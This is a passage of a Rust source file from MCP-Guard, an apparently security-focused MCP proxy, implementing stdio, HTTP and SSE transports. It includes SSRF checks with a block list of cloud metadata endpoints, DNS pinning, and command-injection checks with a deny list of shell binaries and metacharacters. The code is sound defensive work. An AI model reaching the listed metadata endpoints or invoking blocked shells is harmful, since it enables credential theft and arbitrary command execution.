// Copyright (c) 2025 Austin Green
// SPDX-License-Identifier: AGPL-3.0
//
// This file is part of MCP-Guard.
//
// MCP-Guard is free software: you can redistribute it and/or modify
// it under the terms of the GNU Affero General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// MCP-Guard is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU Affero General Public License for more details.
//
// You should have received a copy of the GNU Affero General Public License
// along with MCP-Guard. If not, see <https://www.gnu.org/licenses/>.
//! MCP transport implementations

use async_trait::async_trait;
use std::collections::HashMap;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::process::{Child, Command};
use tokio::sync::mpsc;
use tokio_util::sync::CancellationToken;

// ============================================================================
// Constants
// ============================================================================

/// Channel buffer size for transport messages.
/// 32 messages provides headroom for burst traffic while keeping memory bounded.
/// Stdio transports typically process messages sequentially, so large buffers aren't needed.
const TRANSPORT_CHANNEL_SIZE: usize = 32;

/// Default HTTP request timeout.
/// 30 seconds balances allowing time for slow MCP operations (like file searches)
/// while preventing indefinite hangs on unresponsive servers.
const HTTP_REQUEST_TIMEOUT_SECS: u64 = 30;

/// Maximum length for error body content in error messages.
/// SECURITY: Truncate response bodies to prevent sensitive data leakage in logs
/// while still providing useful debugging information.
const MAX_ERROR_BODY_LEN: usize = 200;

/// Timeout for graceful shutdown before forced termination.
/// 5 seconds gives child processes time to clean up while preventing indefinite hangs.
const GRACEFUL_SHUTDOWN_TIMEOUT_SECS: u64 = 5;

/// Maximum message size for MCP JSON-RPC messages.
/// SECURITY: 10MB limit prevents memory exhaustion from malicious oversized messages.
/// MCP protocol typically uses messages <1MB; 10MB provides headroom for large tool
/// responses (file contents, search results) while preventing DoS attacks.
pub const MAX_MESSAGE_SIZE: usize = 10 * 1024 * 1024; // 10MB

/// Maximum pending HTTP responses before backpressure.
/// SECURITY: Prevents memory exhaustion from send() calls without receive().
/// HTTP transport queues responses from send() to receive(). Without a limit,
/// a client could exhaust memory by calling send() repeatedly without calling receive().
/// 100 provides ample buffering while preventing resource exhaustion.
const MAX_PENDING_HTTP_RESPONSES: usize = 100;

/// Transport error type
#[derive(Debug, thiserror::Error)]
pub enum TransportError {
    #[error("Failed to spawn process: {0}")]
    Spawn(#[from] std::io::Error),

    #[error("Process exited unexpectedly")]
    ProcessExited,

    #[error("Failed to send message: {0}")]
    Send(String),

    #[error("Failed to receive message: {0}")]
    Receive(String),

    #[error("Invalid message format: {0}")]
    InvalidMessage(String),

    #[error("Connection closed")]
    ConnectionClosed,

    #[error("HTTP error: {0}")]
    Http(String),

    #[error("SSE error: {0}")]
    Sse(String),

    #[error("Timeout")]
    Timeout,

    #[error("SSRF blocked: {0}")]
    SsrfBlocked(String),

    #[error("Invalid URL: {0}")]
    InvalidUrl(String),

    #[error("Command validation failed: {0}")]
    CommandValidation(String),
}

/// Truncate error body to prevent sensitive data leakage in logs
/// SECURITY: Response bodies from external services may contain sensitive information
fn truncate_error_body(body: &str) -> String {
    if body.len() <= MAX_ERROR_BODY_LEN {
        body.to_string()
    } else {
        format!("{}... (truncated)", &body[..MAX_ERROR_BODY_LEN])
    }
}

// ============================================================================
// URL Validation (SSRF Prevention)
// ============================================================================

/// Check if an IPv4 address is in a private/internal range
fn is_private_ipv4(ip: &Ipv4Addr) -> bool {
    // Private ranges (RFC 1918)
    ip.is_private()
        // Loopback (127.0.0.0/8)
        || ip.is_loopback()
        // Link-local (169.254.0.0/16) - includes cloud metadata endpoints
        || ip.is_link_local()
        // Broadcast
        || ip.is_broadcast()
        // Documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24)
        || ip.is_documentation()
        // Unspecified (0.0.0.0)
        || ip.is_unspecified()
        // Shared address space (100.64.0.0/10) - RFC 6598
        || (ip.octets()[0] == 100 && (ip.octets()[1] & 0xC0) == 64)
        // Reserved for future use (240.0.0.0/4)
        || ip.octets()[0] >= 240
}

/// Check if an IPv6 address is in a private/internal range
fn is_private_ipv6(ip: &Ipv6Addr) -> bool {
    // Loopback (::1)
    ip.is_loopback()
        // Unspecified (::)
        || ip.is_unspecified()
        // IPv4-mapped addresses - check the embedded IPv4
        || ip.to_ipv4_mapped().map(|v4| is_private_ipv4(&v4)).unwrap_or(false)
        // Unique local addresses (fc00::/7)
        || (ip.segments()[0] & 0xfe00) == 0xfc00
        // Link-local (fe80::/10)
        || (ip.segments()[0] & 0xffc0) == 0xfe80
}

/// Check if an IP address is private/internal
fn is_private_ip(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => is_private_ipv4(v4),
        IpAddr::V6(v6) => is_private_ipv6(v6),
    }
}

/// A URL that has been validated for SSRF with cached resolved IP addresses.
///
/// SECURITY: This struct prevents DNS rebinding attacks by caching the IP addresses
/// that were validated during SSRF checks. When making HTTP requests, use these
/// cached IPs instead of re-resolving DNS to prevent TOCTOU vulnerabilities.
#[derive(Debug, Clone)]
pub struct ValidatedUrl {
    /// The original URL string
    pub url: String,
    /// Resolved IP addresses (if DNS resolution was performed)
    /// These IPs have been validated as non-private and safe to connect to.
    pub resolved_ips: Vec<std::net::SocketAddr>,
    /// The host from the URL for DNS pinning
    pub host: String,
    /// The port from the URL
    pub port: u16,
}

impl ValidatedUrl {
    /// Get the URL string
    pub fn as_str(&self) -> &str {
        &self.url
    }
}

/// Validate a URL for SSRF safety and return validated URL with resolved IPs.
///
/// This function checks that a URL:
/// - Has a valid HTTP or HTTPS scheme
/// - Does not target private/internal IP ranges
/// - Does not target cloud metadata endpoints
///
/// SECURITY: Returns a `ValidatedUrl` containing cached resolved IP addresses.
/// This prevents DNS rebinding attacks by allowing callers to pin requests to
/// the validated IPs instead of re-resolving DNS at request time.
///
/// Returns `ValidatedUrl` if safe, or an error describing why it's blocked.
pub async fn validate_url_for_ssrf(url: &str) -> Result<ValidatedUrl, TransportError> {
    // Parse the URL
    let parsed = url::Url::parse(url)
        .map_err(|e| TransportError::InvalidUrl(format!("Failed to parse URL: {}", e)))?;

    // Validate scheme
    match parsed.scheme() {
        "http" | "https" => {}
        scheme => {
            return Err(TransportError::SsrfBlocked(format!(
                "Invalid URL scheme '{}', only http and https are allowed",
                scheme
            )));
        }
    }

    // Get the host
    let host = parsed
        .host_str()
        .ok_or_else(|| TransportError::InvalidUrl("URL has no host".to_string()))?;

    // Block common cloud metadata hostnames
    let blocked_hosts = [
        "metadata.google.internal",
        "metadata.goog",
        "169.254.169.254",
        "fd00:ec2::254",
        "metadata.azure.internal",
        "100.100.100.200", // Alibaba Cloud
    ];

    let host_lower = host.to_lowercase();
    for blocked in &blocked_hosts {
        if host_lower == *blocked {
            return Err(TransportError::SsrfBlocked(format!(
                "Access to cloud metadata endpoint '{}' is blocked",
                host
            )));
        }
    }

    // Determine port (use URL's port or default based on scheme)
    let port = parsed.port().unwrap_or(match parsed.scheme() {
        "https" => 443,
        _ => 80,
    });

    // If the host is an IP address, check if it's private
    if let Ok(ip) = host.parse::<IpAddr>() {
        if is_private_ip(&ip) {
            return Err(TransportError::SsrfBlocked(format!(
                "Access to private/internal IP address '{}' is blocked",
                ip
            )));
        }
        // Direct IP - create socket addr and return
        let socket_addr = std::net::SocketAddr::new(ip, port);
        return Ok(ValidatedUrl {
            url: url.to_string(),
            resolved_ips: vec![socket_addr],
            host: host.to_string(),
            port,
        });
    }

    // For hostnames, perform DNS resolution and validate all resolved IPs
    // SECURITY: We cache the resolved IPs to prevent DNS rebinding attacks.
    let socket_addr_str = format!("{}:{}", host, port);

    match tokio::net::lookup_host(socket_addr_str).await {
        Ok(addrs) => {
            let mut validated_ips = Vec::new();
            for addr in addrs {
                if is_private_ip(&addr.ip()) {
                    return Err(TransportError::SsrfBlocked(format!(
                        "Hostname '{}' resolves to private/internal IP address '{}'",
                        host,
                        addr.ip()
                    )));
                }
                validated_ips.push(addr);
            }

            if validated_ips.is_empty() {
                return Err(TransportError::InvalidUrl(format!(
                    "DNS resolution for '{}' returned no addresses",
                    host
                )));
            }

            tracing::debug!(
                "Validated URL '{}' with {} resolved IPs: {:?}",
                url,
                validated_ips.len(),
                validated_ips
            );

            Ok(ValidatedUrl {
                url: url.to_string(),
                resolved_ips: validated_ips,
                host: host.to_string(),
                port,
            })
        }
        Err(e) => {
            // DNS resolution failed - this is now an error since we need IPs to pin
            Err(TransportError::InvalidUrl(format!(
                "DNS resolution failed for '{}': {}",
                host, e
            )))
        }
    }
}

// ============================================================================
// Command Validation (Injection Prevention)
// ============================================================================

/// Shell metacharacters that could be used for command injection
const SHELL_METACHARACTERS: &[char] = &[
    ';',  // Command separator
    '|',  // Pipe
    '&',  // Background/AND
    '$',  // Variable expansion
    '`',  // Command substitution
    '(',  // Subshell
    ')',  // Subshell
    '{',  // Brace expansion
    '}',  // Brace expansion
    '<',  // Redirection
    '>',  // Redirection
    '\n', // Newline (command separator)
    '\r', // Carriage return
];

/// Characters that are suspicious in commands but not always dangerous
const SUSPICIOUS_CHARACTERS: &[char] = &[
    '!', // History expansion
    '~', // Home expansion (usually safe but can be abused)
    '*', // Glob
    '?', // Glob
    '[', // Glob pattern
    ']', // Glob pattern
];

/// Validate a command for injection safety
///
/// This function checks that a command:
/// - Does not contain shell metacharacters that could enable injection
/// - Does not start with suspicious prefixes
///
/// Returns `Ok(())` if the command is safe, or an error describing why it's blocked.
pub fn validate_command_for_injection(command: &str) -> Result<(), TransportError> {
    // Empty command is invalid
    if command.is_empty() {
        return Err(TransportError::CommandValidation(
            "Command cannot be empty".to_string(),
        ));
    }

    // Check for shell metacharacters
    for &c in SHELL_METACHARACTERS {
        if command.contains(c) {
            let char_display = match c {
                '\n' => "\\n".to_string(),
                '\r' => "\\r".to_string(),
                _ => c.to_string(),
            };
            return Err(TransportError::CommandValidation(format!(
                "Command contains forbidden shell metacharacter '{}'",
                char_display
            )));
        }
    }

    // Warn about suspicious characters (but don't block for now - some legitimate uses)
    for &c in SUSPICIOUS_CHARACTERS {
        if command.contains(c) {
            tracing::warn!(
                command = %command,
                character = %c,
                "Command contains suspicious character - consider using absolute paths"
            );
        }
    }

    // Block commands that try to invoke a shell directly
    let shell_commands = [
        "sh",
        "bash",
        "zsh",
        "fish",
        "csh",
        "ksh",
        "dash",
        "cmd",
        "powershell",
        "pwsh",
    ];

    // Get the command basename
    let basename = std::path::Path::new(command)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(command);

    for shell in shell_commands {
        if basename == shell || basename == format!("{}.exe", shell) {
            return Err(TransportError::CommandValidation(format!(
                "Direct shell execution '{}' is not allowed - specify the actual MCP server command",
                command
            )));
        }
    }

    Ok(())
}

/// Validate command arguments for injection safety
///
/// Checks that arguments don't contain shell metacharacters.
pub fn validate_args_for_injection(args: &[String]) -> Result<(), TransportError> {
    for (i, arg) in args.iter().enumerate() {
        for &c in SHELL_METACHARACTERS {
            if arg.contains(c) {
                let char_display = match c {
                    '\n' => "\\n".to_string(),
                    '\r' => "\\r".to_string(),
                    _ => c.to_string(),
                };
                return Err(TransportError::CommandValidation(format!(
                    "Argument {} contains forbidden shell metacharacter '{}'",
                    i, char_display
                )));
            }
        }
    }
    Ok(())
}

/// MCP JSON-RPC message
///
/// Represents a JSON-RPC 2.0 message used in the Model Context Protocol.
/// Can be a request (has method + id), notification (has method, no id),
/// or response (has result or error + id).
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct Message {
    /// JSON-RPC version, always "2.0"
    pub jsonrpc: String,
    /// Request/response ID for correlating requests with responses.
    /// Present in requests and responses, absent in notifications.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub id: Option<serde_json::Value>,
    /// Method name for requests/notifications (e.g., "tools/call", "tools/list")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub method: Option<String>,
    /// Method parameters for requests/notifications
    #[serde(skip_serializing_if = "Option::is_none")]
    pub params: Option<serde_json::Value>,
    /// Successful response data (mutually exclusive with error)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub result: Option<serde_json::Value>,
    /// Error response data with code and message (mutually exclusive with result)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<serde_json::Value>,
}

impl Message {
    pub fn request(
        id: impl Into<serde_json::Value>,
        method: &str,
        params: Option<serde_json::Value>,
    ) -> Self {
        Self {
            jsonrpc: "2.0".to_string(),
            id: Some(id.into()),
            method: Some(method.to_string()),
            params,
            result: None,
            error: None,
        }
    }

    pub fn response(id: serde_json::Value, result: serde_json::Value) -> Self {
        Self {
            jsonrpc: "2.0".to_string(),
            id: Some(id),
            method: None,
            params: None,
            result: Some(result),
            error: None,
        }
    }

    pub fn error_response(id: Option<serde_json::Value>, code: i32, message: &str) -> Self {
        Self {
            jsonrpc: "2.0".to_string(),
            id,
            method: None,
            params: None,
            result: None,
            error: Some(serde_json::json!({
                "code": code,
                "message": message
            })),
        }
    }

    pub fn is_request(&self) -> bool {
        self.method.is_some() && self.id.is_some()
    }

    pub fn is_notification(&self) -> bool {
        self.method.is_some() && self.id.is_none()
    }

    pub fn is_response(&self) -> bool {
        self.result.is_some() || self.error.is_some()
    }
}

/// Transport trait for MCP communication
#[async_trait]
pub trait Transport: Send + Sync {
    /// Send a message to the upstream server
    async fn send(&self, message: Message) -> Result<(), TransportError>;

    /// Receive a message from the upstream server
    async fn receive(&self) -> Result<Message, TransportError>;

    /// Close the transport
    async fn close(&self) -> Result<(), TransportError>;

    /// Get the transport type name for metrics
    fn transport_type(&self) -> &'static str;
}

/// Stdio transport for communicating with a subprocess
///
/// Spawns an MCP server process and communicates via stdin/stdout using
/// newline-delimited JSON. Background tasks handle reading and writing
/// to avoid blocking the async runtime.
pub struct StdioTransport {
    /// Sender for outbound messages to the subprocess
    tx: mpsc::Sender<Message>,
    /// Receiver for inbound messages from the subprocess (mutex for shared access)
    rx: tokio::sync::Mutex<mpsc::Receiver<Message>>,
    /// Child process handle (kept alive for process lifetime)
    child: tokio::sync::Mutex<Child>,
    /// Background task writing messages to subprocess stdin
    writer_task: tokio::task::JoinHandle<()>,
    /// Background task reading messages from subprocess stdout
    reader_task: tokio::task::JoinHandle<()>,
    /// Cancellation token for graceful shutdown
    shutdown_token: CancellationToken,
}

impl StdioTransport {
    /// Spawn a subprocess with command validation
    ///
    /// Validates the command and arguments to prevent shell injection attacks.
    ///
    /// # Errors
    /// Returns `TransportError::CommandValidation` if the command or arguments
    /// contain shell metacharacters or attempt direct shell execution.
    pub async fn spawn(command: &str, args: &[String]) -> Result<Self, TransportError> {
        validate_command_for_injection(command)?;
        validate_args_for_injection(args)?;
        Self::spawn_unchecked(command, args).await
    }

    /// Spawn a subprocess without command validation
    ///
    /// # Safety
    /// This bypasses command injection protection. Only use when the command
    /// is from a trusted source (e.g., hardcoded in the application or validated
    /// through other means).
    pub async fn spawn_unchecked(command: &str, args: &[String]) -> Result<Self, TransportError> {
        let mut child = Command::new(command)
            .args(args)
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::inherit())
            .spawn()?;

        let stdin = child.stdin.take().ok_or_else(|| {
            TransportError::Spawn(std::io::Error::other(
                "Failed to capture stdin pipe from child process",
            ))
        })?;
        let stdout = child.stdout.take().ok_or_else(|| {
            TransportError::Spawn(std::io::Error::other(
                "Failed to capture stdout pipe from child process",
            ))
        })?;

        let (to_process_tx, mut to_process_rx) = mpsc::channel::<Message>(TRANSPORT_CHANNEL_SIZE);
        let (from_process_tx, from_process_rx) = mpsc::channel::<Message>(TRANSPORT_CHANNEL_SIZE);

        // Create shutdown token for graceful shutdown coordination
        let shutdown_token = CancellationToken::new();
        let writer_shutdown = shutdown_token.clone();
        let reader_shutdown = shutdown_token.clone();

        // Writer task with shutdown support
        let writer_task = tokio::spawn(async move {
            let mut stdin = stdin;
            loop {
                tokio::select! {
                    _ = writer_shutdown.cancelled() => {
                        tracing::debug!("Writer task received shutdown signal");
                        break;
                    }
                    msg = to_process_rx.recv() => {
                        match msg {
                            Some(msg) => {
                                let json = match serde_json::to_string(&msg) {
                                    Ok(j) => j,
                                    Err(e) => {
                                        tracing::error!(error = %e, "Failed to serialize MCP message, dropping");
                                        continue;
                                    }
                                };
                                if let Err(e) = stdin.write_all(json.as_bytes()).await {
                                    tracing::error!(error = %e, "Failed to write to stdin, writer task exiting");
                                    break;
                                }
                                if let Err(e) = stdin.write_all(b"\n").await {
                                    tracing::error!(error = %e, "Failed to write newline to stdin, writer task exiting");
                                    break;
                                }
                                if let Err(e) = stdin.flush().await {
                                    tracing::error!(error = %e, "Failed to flush stdin, writer task exiting");
                                    break;
                                }
                            }
                            None => {
                                tracing::debug!("Channel closed, writer task exiting");
                                break;
                            }
                        }
                    }
                }
            }
            tracing::debug!("Writer task exiting");
        });

        // Reader task with shutdown support
        let reader_task = tokio::spawn(async move {
            let reader = BufReader::new(stdout);
            let mut lines = reader.lines();
            loop {
                tokio::select! {
                    _ = reader_shutdown.cancelled() => {
                        tracing::debug!("Reader task received shutdown signal");
                        break;
                    }
                    result = lines.next_line() => {
                        match result {
                            Ok(Some(line)) => {
                                // SECURITY: Validate message size to prevent memory exhaustion
                                if line.len() > MAX_MESSAGE_SIZE {
                                    tracing::error!(
                                        size = line.len(),
                                        max_size = MAX_MESSAGE_SIZE,
                                        "Rejected oversized message from subprocess stdout, dropping"
                                    );
                                    // Don't send to channel - drop the message
                                    continue;
                                }

                                match serde_json::from_str::<Message>(&line) {
                                    Ok(msg) => {
                                        if from_process_tx.send(msg).await.is_err() {
                                            tracing::debug!("Receiver dropped, reader task exiting");
                                            break;
                                        }
                                    }
                                    Err(e) => {
                                        tracing::warn!(
                                            error = %e,
                                            line = %line.chars().take(100).collect::<String>(),
                                            "Failed to parse MCP message, skipping"
                                        );
                                    }
                                }
                            }
                            Ok(None) => {
                                tracing::debug!("EOF from process, reader task exiting");
                                break;
                            }
                            Err(e) => {
                                tracing::error!(error = %e, "Failed to read from stdout, reader task exiting");
                                break;
                            }
                        }
                    }
                }
            }
            tracing::debug!("Reader task exiting");
        });

        Ok(Self {
            tx: to_process_tx,
            rx: tokio::sync::Mutex::new(from_process_rx),
            child: tokio::sync::Mutex::new(child),
            writer_task,
            reader_task,
            shutdown_token,
        })
    }

    /// Check if the transport tasks are still running
    pub fn is_healthy(&self) -> bool {
        !self.writer_task.is_finished() && !self.reader_task.is_finished()
    }
}

#[async_trait]
impl Transport for StdioTransport {
    async fn send(&self, message: Message) -> Result<(), TransportError> {
        self.tx
            .send(message)
            .await
            .map_err(|e| TransportError::Send(e.to_string()))
    }

    async fn receive(&self) -> Result<Message, TransportError> {
        self.rx
            .lock()
            .await
            .recv()
            .await
            .ok_or(TransportError::ConnectionClosed)
    }

    async fn close(&self) -> Result<(), TransportError> {
        // Signal background tasks to stop
        self.shutdown_token.cancel();

        let mut child = self.child.lock().await;

        // Get child PID for graceful termination
        let child_id = child.id();

        #[cfg(unix)]
        if let Some(pid) = child_id {
            // Send SIGTERM first for graceful shutdown
            tracing::debug!(pid = pid, "Sending SIGTERM to child process");
            // SAFETY: Using libc::kill with valid PID and SIGTERM signal
            unsafe {
                libc::kill(pid as i32, libc::SIGTERM);
            }

            // Wait for process to exit with timeout
            let shutdown_timeout = Duration::from_secs(GRACEFUL_SHUTDOWN_TIMEOUT_SECS);
            match tokio::time::timeout(shutdown_timeout, child.wait()).await {
                Ok(Ok(status)) => {
                    tracing::debug!(pid = pid, ?status, "Child process exited gracefully");
                    return Ok(());
                }
                Ok(Err(e)) => {
                    tracing::warn!(pid = pid, error = %e, "Error waiting for child process");
                    // Fall through to SIGKILL
                }
                Err(_) => {
                    tracing::warn!(
                        pid = pid,
                        timeout_secs = GRACEFUL_SHUTDOWN_TIMEOUT_SECS,
                        "Child process did not exit gracefully, sending SIGKILL"
                    );
                    // Fall through to SIGKILL
                }
            }
        }

        // Force kill if graceful shutdown failed or on Windows
        tracing::debug!("Force killing child process");
        child.kill().await?;
        Ok(())
    }

    fn transport_type(&self) -> &'static str {
        "stdio"
    }
}

// ============================================================================
// HTTP Transport (FR-PROXY-03)
// ============================================================================

/// HTTP transport for communicating with an upstream MCP server over HTTP
///
/// This transport sends JSON-RPC messages via HTTP POST requests and receives
/// responses in the HTTP response body. It implements a request-response pattern
/// suitable for standard HTTP endpoints.
///
/// SECURITY: When created via `new()` or `with_config()`, this transport uses
/// DNS pinning to prevent DNS rebinding attacks. The resolved IP addresses from
/// SSRF validation are cached and used for all subsequent requests.
pub struct HttpTransport {
    /// Reusable HTTP client with connection pooling and optional DNS pinning
    client: reqwest::Client,
    /// Base URL of the upstream MCP server (e.g., "http://localhost:8080/mcp")
    url: String,
    /// Additional headers to include in requests (e.g., for upstream auth)
    headers: HashMap<String, String>,
    /// Request timeout (default: 30 seconds)
    timeout: std::time::Duration,
    /// Queue of responses waiting to be retrieved via `receive()`
    pending_responses: tokio::sync::Mutex<Vec<Message>>,
}

impl HttpTransport {
    /// Build a reqwest client with DNS pinning for the validated URL
    ///
    /// SECURITY: This prevents DNS rebinding attacks by configuring the client
    /// to use the IP addresses that were validated during SSRF checks.
    fn build_pinned_client(validated_url: &ValidatedUrl) -> reqwest::Client {
        let mut builder = reqwest::Client::builder();

        // Pin DNS resolution to the first validated IP address
        // This prevents DNS rebinding attacks where the DNS changes between
        // validation and actual request
        if let Some(first_addr) = validated_url.resolved_ips.first() {
            tracing::debug!(
                "Pinning DNS for '{}' to {}",
                validated_url.host,
                first_addr.ip()
            );
            builder = builder.resolve(&validated_url.host, *first_addr);
        }

        builder.build().unwrap_or_else(|_| reqwest::Client::new())
    }

    /// Create a new HTTP transport with SSRF validation and DNS pinning
    ///
    /// SECURITY: This validates the URL against SSRF attacks and pins DNS
    /// resolution to prevent DNS rebinding attacks.
    ///
    /// # Errors
    /// Returns `TransportError::SsrfBlocked` if the URL targets a private/internal IP range
    /// or cloud metadata endpoint.
    pub async fn new(url: String) -> Result<Self, TransportError> {
        let validated_url = validate_url_for_ssrf(&url).await?;
        let client = Self::build_pinned_client(&validated_url);

        Ok(Self {
            client,
            url,
            headers: HashMap::new(),
            timeout: std::time::Duration::from_secs(HTTP_REQUEST_TIMEOUT_SECS),
            pending_responses: tokio::sync::Mutex::new(Vec::new()),
        })
    }

    /// Create a new HTTP transport without SSRF validation or DNS pinning
    ///
    /// # Safety
    /// This bypasses SSRF protection and DNS pinning. Only use when the URL is
    /// from a trusted source (e.g., hardcoded in the application) or when
    /// connecting to localhost for testing.
    pub fn new_unchecked(url: String) -> Self {
        Self {
            client: reqwest::Client::new(),
            url,
            headers: HashMap::new(),
            timeout: std::time::Duration::from_secs(HTTP_REQUEST_TIMEOUT_SECS),
            pending_responses: tokio::sync::Mutex::new(Vec::new()),
        }
    }

    /// Create a new HTTP transport with custom configuration, SSRF validation, and DNS pinning
    ///
    /// SECURITY: This validates the URL against SSRF attacks and pins DNS
    /// resolution to prevent DNS rebinding attacks.
    ///
    /// # Errors
    /// Returns `TransportError::SsrfBlocked` if the URL targets a private/internal IP range
    /// or cloud metadata endpoint.
    pub async fn with_config(
        url: String,
        headers: HashMap<String, String>,
        timeout_secs: u64,
    ) -> Result<Self, TransportError> {
        let validated_url = validate_url_for_ssrf(&url).await?;
        let client = Self::build_pinned_client(&validated_url);

        Ok(Self {
            client,
            url,
            headers,
            timeout: std::time::Duration::from_secs(timeout_secs),
            pending_responses: tokio::sync::Mutex::new(Vec::new()),
        })
    }

    /// Send a request and get the response immediately
    async fn send_request(&self, message: &Message) -> Result<Message, TransportError> {
        let mut request = self
            .client
            .post(&self.url)
            .header("Content-Type", "application/json")
            .timeout(self.timeout);

        // Add custom headers
        for (key, value) in &self.headers {
            request = request.header(key, value);
        }

        let response = request.json(message).send().await.map_err(|e| {
            if e.is_timeout() {
                TransportError::Timeout
            } else {
                TransportError::Http(e.to_string())
            }
        })?;

        let status = response.status();
        if !status.is_success() {
            let body = response.text().await.unwrap_or_default();
            return Err(TransportError::Http(format!(
                "HTTP {}: {}",
                status,
                truncate_error_body(&body)
            )));
        }

        // SECURITY: Validate response size before deserializing
        // Large JSON responses could cause memory exhaustion
        let content_length = response.content_length();
        if let Some(len) = content_length {
            if len > MAX_MESSAGE_SIZE as u64 {
                return Err(TransportError::Http(format!(
                    "Response size {} bytes exceeds maximum {}",
                    len, MAX_MESSAGE_SIZE
                )));
            }
        }

        // Read response body with size limit
        let body_bytes = response
            .bytes()
            .await
            .map_err(|e| TransportError::Http(format!("Failed to read response body: {}", e)))?;

        if body_bytes.len() > MAX_MESSAGE_SIZE {
            return Err(TransportError::Http(format!(
                "Response body {} bytes exceeds maximum {}",
                body_bytes.len(),
                MAX_MESSAGE_SIZE
            )));
        }

        let response_message: Message = serde_json::from_slice(&body_bytes)
            .map_err(|e| TransportError::InvalidMessage(e.to_string()))?;

        Ok(response_message)
    }
}

#[async_trait]
impl Transport for HttpTransport {
    async fn send(&self, message: Message) -> Result<(), TransportError> {
        // For HTTP transport, we send and immediately queue the response
        let response = self.send_request(&message).await?;

        // SECURITY: Enforce max pending responses to prevent memory exhaustion
        let mut pending = self.pending_responses.lock().await;
        if pending.len() >= MAX_PENDING_HTTP_RESPONSES {
            return Err(TransportError::Http(format!(
                "Too many pending responses ({}/{}). Call receive() to consume responses.",
                pending.len(),
                MAX_PENDING_HTTP_RESPONSES
            )));
        }
        pending.push(response);
        Ok(())
    }

    async fn receive(&self) -> Result<Message, TransportError> {
        // Pop the next pending response
        self.pending_responses
            .lock()
            .await
            .pop()
            .ok_or(TransportError::ConnectionClosed)
    }

    async fn close(&self) -> Result<(), TransportError> {
        // HTTP is stateless, nothing to close
        Ok(())
    }

    fn transport_type(&self) -> &'static str {
        "http"
    }
}

// ============================================================================
// SSE Transport (FR-PROXY-04)
// ============================================================================

/// SSE transport for communicating with an upstream MCP server over Server-Sent Events
///
/// This transport uses HTTP POST to send requests and SSE to receive streaming
/// responses. The MCP Streamable HTTP transport specification defines that:
/// - Requests are sent via HTTP POST
/// - Responses can be either JSON (immediate) or SSE stream (streaming)
///
/// SECURITY: When created via `connect()` or `connect_with_config()`, this transport uses
/// DNS pinning to prevent DNS rebinding attacks. The resolved IP addresses from
/// SSRF validation are cached and used for all subsequent requests.
///
/// The SSE format follows the standard:
/// ```text
/// event: message
/// data: {"jsonrpc": "2.0", "id": 1, "result": {...}}
/// ```
pub struct SseTransport {
    /// Reusable HTTP client with connection pooling and optional DNS pinning
    client: reqwest::Client,
    /// Base URL of the upstream MCP server SSE endpoint
    url: String,
    /// Additional headers to include in requests (e.g., for upstream auth)
    headers: HashMap<String, String>,
    /// Initial connection timeout (default: 30 seconds)
    timeout: std::time::Duration,
    /// Receiver for messages parsed from the SSE stream
    rx: tokio::sync::Mutex<mpsc::Receiver<Message>>,
    /// Sender used by SSE stream handler to deliver parsed messages
    tx: mpsc::Sender<Message>,
}

impl SseTransport {
    /// Build a reqwest client with DNS pinning for the validated URL
    ///
    /// SECURITY: This prevents DNS rebinding attacks by configuring the client
    /// to use the IP addresses that were validated during SSRF checks.
    fn build_pinned_client(validated_url: &ValidatedUrl) -> reqwest::Client {
        let mut builder = reqwest::Client::builder();

        // Pin DNS resolution to the first validated IP address
        if let Some(first_addr) = validated_url.resolved_ips.first() {
            tracing::debug!(
                "Pinning SSE DNS for '{}' to {}",
                validated_url.host,
                first_addr.ip()
            );
            builder = builder.resolve(&validated_url.host, *first_addr);
        }

        builder.build().unwrap_or_else(|_| reqwest::Client::new())
    }

    /// Create a new SSE transport with SSRF validation and DNS pinning
    ///
    /// SECURITY: This validates the URL against SSRF attacks and pins DNS
    /// resolution to prevent DNS rebinding attacks.
    ///
    /// # Errors
    /// Returns `TransportError::SsrfBlocked` if the URL targets a private/internal IP range
    /// or cloud metadata endpoint.
    pub async fn connect(url: String) -> Result<Self, TransportError> {
        Self::connect_with_config(url, HashMap::new(), 30).await
    }

    /// Create a new SSE transport without SSRF validation or DNS pinning
    ///
    /// # Safety
    /// This bypasses SSRF protection and DNS pinning. Only use when the URL is
    /// from a trusted source (e.g., hardcoded in the application) or when
    /// connecting to localhost for testing.
    pub async fn connect_unchecked(url: String) -> Result<Self, TransportError> {
        Self::connect_with_config_unchecked(url, HashMap::new(), 30).await
    }

    /// Create a new SSE transport with custom configuration, SSRF validation, and DNS pinning
    ///
    /// SECURITY: This validates the URL against SSRF attacks and pins DNS
    /// resolution to prevent DNS rebinding attacks.
    ///
    /// # Errors
    /// Returns `TransportError::SsrfBlocked` if the URL targets a private/internal IP range
    /// or cloud metadata endpoint.
    pub async fn connect_with_config(
        url: String,
        headers: HashMap<String, String>,
        timeout_secs: u64,
    ) -> Result<Self, TransportError> {
        let validated_url = validate_url_for_ssrf(&url).await?;
        Self::connect_with_config_internal(url, headers, timeout_secs, Some(&validated_url)).await
    }

    /// Create a new SSE transport with custom configuration without SSRF validation
    ///
    /// # Safety
    /// This bypasses SSRF protection. Only use when the URL is from a trusted source.
    pub async fn connect_with_config_unchecked(
        url: String,
        headers: HashMap<String, String>,
        timeout_secs: u64,
    ) -> Result<Self, TransportError> {
        Self::connect_with_config_internal(url, headers, timeout_secs, None).await
    }

    /// Internal constructor that optionally applies DNS pinning
    async fn connect_with_config_internal(
        url: String,
        headers: HashMap<String, String>,
        timeout_secs: u64,
        validated_url: Option<&ValidatedUrl>,
    ) -> Result<Self, TransportError> {
        let (tx, rx) = mpsc::channel::<Message>(TRANSPORT_CHANNEL_SIZE);

        let client = match validated_url {
            Some(v) => Self::build_pinned_client(v),
            None => reqwest::Client::new(),
        };

        Ok(Self {
            client,
            url,
